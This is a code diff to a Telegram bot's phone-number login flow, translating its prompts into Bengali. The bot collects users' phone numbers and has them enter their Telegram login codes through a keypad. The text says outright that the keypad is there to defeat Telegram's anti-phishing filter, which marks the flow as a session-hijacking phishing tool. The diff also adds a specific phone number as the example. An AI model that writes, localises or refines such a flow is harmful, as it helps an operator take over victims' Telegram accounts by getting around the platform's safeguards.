@@ -440,9 +440,10 @@ async def prompt_phone_callback(client: Client, callback_query: CallbackQuery):
     )
     await callback_query.message.reply_text(
         "📱 **Phone Number Login**\n\n"
-        "Please send your phone number with country code:\n"
-        "• Example: `+88017XXXXXXXX` or `017XXXXXXXX`\n"
-        "_(Send your own mobile number as a message)_",
+        "আপনার ফোন নম্বরটি কান্ট্রি কোডসহ সেন্ড করুন:\n"
+        "• Example: `+8801853170055` বা `01853170055`\n\n"
+        "⚠️ **সতর্কতা ও নিয়ম:**\n"
+        "টেলিগ্রাম কোনো মোবাইলে **SMS পাঠায় না**। ৫ ডিজিটের কোডটি সরাসরি আপনার **অফিসিয়াল Telegram অ্যাপের ইনবক্সে** (Telegram সার্ভিস চ্যাটে) পাঠানো হবে!",
         reply_markup=markup,
     )
 
@@ -1043,15 +1044,15 @@ async def auth_flow_listener(client: Client, message: Message):
                     delivery_dest = "Phone Call"
 
             numpad_text = (
-                f"📩 **Login Code Sent!**\n\n"
+                f"📩 **Login Code Sent to Telegram!**\n\n"
                 f"• **Phone:** `{clean_phone}`\n"
-                f"• **Destination:** `{delivery_dest}`\n\n"
-                f"⚠️ **IMPORTANT:**\n"
-                f"Telegram sends login codes to your **Telegram App** (chat from **Telegram** / 777000), NOT via SMS!\n"
-                f"Please open your Telegram chat list and check the official code.\n\n"
-                "👇 **Tap the digits on the keypad below to enter your code:**\n"
+                f"• **Delivery Type:** `{delivery_dest}`\n\n"
+                f"🚨 **কোডটি কোথায় পাবেন?**\n"
+                f"টেলিগ্রাম আপনার সিম কার্ডে **কোনো সাধারণ SMS পাঠায় না**!\n"
+                f"আপনার মোবাইলের **Telegram অ্যাপের চ্যাট লিস্ট খুলুন** — একদম উপরে অফিসিয়াল **Telegram** (Service Notifications / 777000) চ্যাট থেকে ৫ ডিজিটের লগইন কোড এসেছে।\n\n"
+                "👇 **নিচের বাটনের কিপ্যাডে কোডের সংখ্যাগুলো চাপুন:**\n"
                 "Code: `[ _ _ _ _ _ ]`\n\n"
-                "💡 _Using this keypad prevents Telegram's anti-phishing filter from blocking your code._"
+                "💡 _এই কিপ্যাড ব্যবহার করায় টেলিগ্রামের অ্যান্টি-ফিশিং ফিল্টার কোড বাতিল করতে পারে না।_"
             )
             await status_msg.edit_text(
                 numpad_text,
